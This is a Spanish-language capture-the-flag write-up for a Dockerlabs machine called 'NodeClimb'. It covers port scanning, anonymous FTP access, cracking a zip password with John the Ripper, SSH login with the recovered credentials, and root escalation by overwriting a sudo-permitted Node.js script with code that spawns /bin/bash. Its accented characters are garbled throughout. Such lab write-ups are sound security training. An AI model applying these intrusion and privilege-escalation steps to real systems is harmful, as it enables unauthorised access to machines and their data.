
# Write-up: 

- **Nombre de la m치quina:** `NodeClimb` 
- **Plataforma:** `Dockerlabs` 
- **IP:** `172.17.0.2` 
- **SO:** `Linux` 
- **Dificultad:** `F치cil`

---

## 1. RECONOCIMIENTO

El objetivo de esta fase es identificar los puntos de entrada y servicios expuestos en la m치quina v칤ctima.

#### 1.1. Verificaci칩n de Conectividad

Se lanza un `ping` para confirmar que la m치quina est치 activa y obtener el TTL lo que puede darnos una primera pista sobre el sistema operativo.

```
 ping 172.17.0.2
```
Nos devuelve conectividad y un TTL=64 por lo que estamos ante una m치quina Linux. 
<p align="center">
    <img src="Imagenes/237.png" width="1000">
</p>
 
#### 1.2. Escaneo de Puertos

Se realiza un escaneo con **Nmap** para descubrir puertos abiertos, los servicios que corren en ellos y sus versiones.

```
sudo nmap -p- -sV -sC -sS --min-rate 5000 --open -n -Pn 172.17.0.2 -oN port_scan.txt
```

**Puertos Descubiertos:**

| Puerto | Servicio | Versi칩n       | Notas                                                 |
| ------ | -------- | ------------- | ----------------------------------------------------- |
| 21     | ftp      | vsftpd 3.0.3  | Iniciamos por aqu칤.<br>Posible sesi칩n nula            |
| 22     | ssh      | OpenSSH 9.2p1 | A la espera de credenciales segundo vector de ataque. |

<p align="center">
    <img src="Imagenes/238.png" width="1000">
</p>

Normalmente el acceso por el puerto 22 al servicio ssh requiere de credenciales. Ya sea usuario y contrase침a o clave rsa. En este caso carecemos de informaci칩n al respecto as칤 que lo m치s productivo es explorar el puerto :21 por pudieron inicia una `session null`

---

## 2. ENUMERACI칍N

Una vez identificados los servicios, se procede a investigarlos en profundidad en busca de vulnerabilidades o informaci칩n 칰til.

### Puerto 21 ( FTP)

Probamos a inciar sesi칩n con credeciales por defecto:

```
ftp 172.17.0.2
```

Name: `anonymous`
Password: `anonymous`

<p align="center">
    <img src="Imagenes/239.png" width="1000">
</p>

Tras listarlo encontramos un archivo llamativo: 
	`secretitopicaron.zip`
Que descargamos a nuestra m치quina local  con `get`

```
get secretitopicaron.zip
```

<p align="center">
    <img src="Imagenes/240.png" width="1000">
</p>

##### 1.Extracci칩n del hash

`zip2john` convierte el ZIP en un hash en formato texto que `John` entiende.

```
zip2john secretitopicaron.zip > zip_hash.txt
```

<p align="center">
    <img src="Imagenes/241.png" width="1000">
</p>


##### 2. Crackeamos con John

Utilizamos `John` para crackear la contrase침a del archivo usando `rockyou`

```
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```

<p align="center">
    <img src="Imagenes/242.png" width="1000">
</p>

##### 3. Comprobamos el resultado

Utilizamos `show` para comprobar el resultado de `john`

```
john --show zip_hash.txt

```
<p align="center">
    <img src="Imagenes/243.png" width="1000">
</p>

- **Hallazgo** :
	Contrase침a: `password1`

##### 4.Descomprimimos el archivo. zip

Para descomprimir el archivo .zip utilizamos la herramienta `unzip`

```
unzip secretitopicaron.zip
```

<p align="center">
    <img src="Imagenes/244.png" width="1000">
</p>

-  **Hallazgo** :
	`mario:laKontrase침AmasmalotaHdelbarrioH`


---

## 3. EXPLOTACI칍N

### 3.1 Acceso inicial:

Con las credenciales descubiertas en el servicio `ftp` con `john`  nos conectamos al servicio ssh:
```
	ssh mario@172.17.0.2`
```


<p align="center">
    <img src="Imagenes/245.png" width="1000">
</p>

---

## 4. ESCALADA DE PRIVILEGIOS

Una vez dentro, el objetivo es elevar los privilegios del usuario actual al de `root`.

### 4.1. Enumeraci칩n Interna

Se realizan comprobaciones b치sicas y se buscan posibles vectores de escalada.

#### Comprobaciones del sistema:

쯈u칠 usuario somos?
`whoami`

<p align="center">
    <img src="Imagenes/246.png" width="1000">
</p>

쮸 qu칠 grupo pertenezco? `id`

<p align="center">
    <img src="Imagenes/247.png" width="1000">
</p>

쯈u칠 usuario hay en el sistema?
쯈u칠 usuario tienen una shell asignada?

```
cat /etc/passwd | grep sh
```

<p align="center">
    <img src="Imagenes/248.png" width="1000">
</p>

Revisamos los directorios de los usuarios:
`mario`:

<p align="center">
    <img src="Imagenes/249.png" width="1000">
</p>
#### B칰squeda del Vector de Escalada:

- **Permisos Sudo:** 쯈u칠 comandos podemos ejecutar como otro usuario (o `root`)?
    ```
    sudo -l
    ```
     vemos que el usuario `mario`  puede ejecutar con sudo el script : `/home/mario/script.js` 
<p align="center">
    <img src="Imagenes/250.png" width="1000">
</p>

- Comprobamos los permisos del script: 
```
	 ls -l /home/mario/script.js
```
	
<p align="center">
    <img src="Imagenes/251.png" width="1000">
</p>
Tenemos permisos sobre el con el usuario `mario`

- Abrimos un archivo nano donde introduciremos un c칩digo malicioso que nos elevar치 privilegios al ejecutar el script. Guardamos. 

```
nano /home/mario/script.js
```
<p align="center">
    <img src="Imagenes/252.png" width="1000">
</p>


```
 // Este c칩digo lanzar치 /bin/bash como root
require('child_process').spawn('/bin/bash', {
  stdio: [0, 1, 2],
  shell: true
});
```


### 4.2. Explotaci칩n y Escalada a Root

- Ejecutamos el script sudo `/usr/bin/node /home/mario/script.js` y nos elevamos a `root`. 

<p align="center">
    <img src="Imagenes/253.png" width="1000">
</p>


SOMOS ROOT游


